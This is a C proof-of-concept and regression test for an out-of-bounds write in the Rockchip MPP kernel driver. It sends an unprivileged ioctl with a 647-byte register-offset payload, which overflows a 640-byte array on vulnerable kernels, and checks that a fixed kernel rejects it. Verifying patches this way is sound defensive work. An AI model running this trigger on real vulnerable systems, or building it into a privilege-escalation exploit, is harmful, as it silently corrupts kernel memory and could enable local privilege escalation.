// SPDX-License-Identifier: GPL-2.0
/*
 * PoC — MPP register-offset out-of-bounds write (forward-port 0055, site 2 /
 * Rockchip BSP develop-6.1 rk_vcodec, mpp_extract_reg_offset_info()).
 *
 * mpp_extract_reg_offset_info() bounded the request by a *floored* element
 * count (cnt = req->size / sizeof(elem)) but then copy_from_user()'d the *raw*
 * req->size bytes into off_inf->elem[]. A byte count that is not a whole
 * number of elements yet floors to the array maximum (80) — e.g. req->size 647
 * -> cnt 80 -> passes "(cnt + off_inf->cnt) > 80" as equal — copies up to seven
 * bytes past the 80-element (640-byte) array, into adjacent struct mpp_task
 * fields (state / abort_request / delayed_work) during task assembly, before
 * any hardware runs. An OOB write over a work_struct is a classic LPE
 * primitive.
 *
 * Reached from the rkvdec2 task-init loop (mpp_rkvdec2.c) which handles
 * MPP_CMD_SET_REG_ADDR_OFFSET by calling mpp_extract_reg_offset_info() and
 * ignoring its return value; a single SET_REG_ADDR_OFFSET message forms a
 * task (set_cnt>0 -> mpp_process_task).
 *
 * Reachability: /dev/mpp_service is group "video" (see the companion
 * foreign-fd PoC). The malformed request needs only a bound decoder session.
 *
 * Fixed behaviour (forward-port 0055): the extractor rejects req->size that is
 * not a whole number of elements ("invalid reg offset size 647") before the
 * copy, so no OOB occurs.
 *
 * This PoC binds a decoder session and submits SET_REG_ADDR_OFFSET with
 * size=647. On a FIXED kernel the guard fires (dmesg: "invalid reg offset
 * size 647") and no memory is corrupted. On a VULNERABLE + KASAN kernel this
 * produces a slab-out-of-bounds write report; on a vulnerable production
 * kernel the corruption is silent. Check the kernel log for the outcome; this
 * PoC exercises the path and stays up on a fixed kernel.
 *
 * Unprivileged. Build: cc -O1 -Wall -o mpp-reg-offset-oob-repro \
 *                        mpp-reg-offset-oob-repro.c
 */
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <linux/rk-mpp.h>

/* elem is {u32 index; u32 offset} == 8 bytes; 80 * 8 = 640-byte array. */
#define ELEM_BYTES		8
#define MAX_ELEMS		80
/* 647 floors to 80 elements (640 B) but copies 647 B -> 7 bytes OOB. */
#define OOB_SIZE		(MAX_ELEMS * ELEM_BYTES + 7)   /* 647 */

static int query_hw_support(int fd, unsigned int *support)
{
	struct mpp_request q = {
		.cmd = MPP_CMD_QUERY_HW_SUPPORT,
		.size = sizeof(*support),
		.data = support,
	};
	return ioctl(fd, MPP_IOC_CFG_V1, &q);
}

int main(void)
{
	int fd = open("/dev/mpp_service", O_RDWR | O_CLOEXEC);
	if (fd < 0) { perror("open /dev/mpp_service"); return 2; }

	unsigned int support = 0;
	if (query_hw_support(fd, &support) != 0 || !support) {
		fprintf(stderr, "QUERY_HW_SUPPORT failed (support=%#x)\n", support);
		return 2;
	}

	/*
	 * Bind a *decoder* client (RKVDEC = type 9 on RK3588; fall back to the
	 * lowest supported type). The extractor lives in the rkvdec2 backend.
	 */
	unsigned int client_type = 9;
	if (!(support & (1u << client_type))) {
		client_type = (unsigned)__builtin_ctz(support);
		printf("note: RKVDEC(9) not in %#x, using client_type %u\n",
		       support, client_type);
	}

	struct mpp_request init = {
		.cmd = MPP_CMD_INIT_CLIENT_TYPE,
		.size = sizeof(client_type),
		.data = &client_type,
	};
	if (ioctl(fd, MPP_IOC_CFG_V1, &init) != 0) {
		fprintf(stderr, "INIT_CLIENT_TYPE(%u) failed: %s\n",
			client_type, strerror(errno));
		return 2;
	}

	/* Malformed reg-offset payload: 647 bytes (non-multiple of 8). */
	unsigned char *payload = calloc(1, OOB_SIZE);
	if (!payload) return 2;

	struct mpp_request off = {
		.cmd = MPP_CMD_SET_REG_ADDR_OFFSET,
		.flags = MPP_FLAGS_MULTI_MSG | MPP_FLAGS_LAST_MSG,
		.size = OOB_SIZE,
		.data = payload,
	};

	printf("submitting SET_REG_ADDR_OFFSET size=%d (floors to %d elems, "
	       "7 bytes OOB on a vulnerable kernel)\n", OOB_SIZE, MAX_ELEMS);
	errno = 0;
	int r = ioctl(fd, MPP_IOC_CFG_V1, &off);
	int err = r ? errno : 0;
	printf("ioctl ret=%d errno=%d\n", r, err);
	printf("check dmesg: fixed kernel logs \"invalid reg offset size %d\" "
	       "and produces NO KASAN out-of-bounds report.\n", OOB_SIZE);

	free(payload);
	close(fd);

	/*
	 * The ioctl result was printed and discarded, so this reported success on a
	 * vulnerable kernel too -- the class 0f34a22 closed in its siblings. The
	 * fixed kernel rejects with -EINVAL (mpp_common.c), so assert it: without this the
	 * program cannot distinguish "the guard held" from "I never reached it".
	 */
	if (r == 0) {
		fprintf(stderr, "FAIL: the out-of-bounds request was ACCEPTED - the 0055 "
			"guard is absent on this kernel\n");
		return 1;
	}
	if (err != EINVAL) {
		fprintf(stderr, "FAIL: rejected with errno=%d, expected EINVAL (%d) from the "
			"0055 guard; the message may have been refused earlier\n",
			err, EINVAL);
		return 1;
	}
	printf("PASS: rejected with -EINVAL; the 0055 guard holds\n");
	return 0;
}
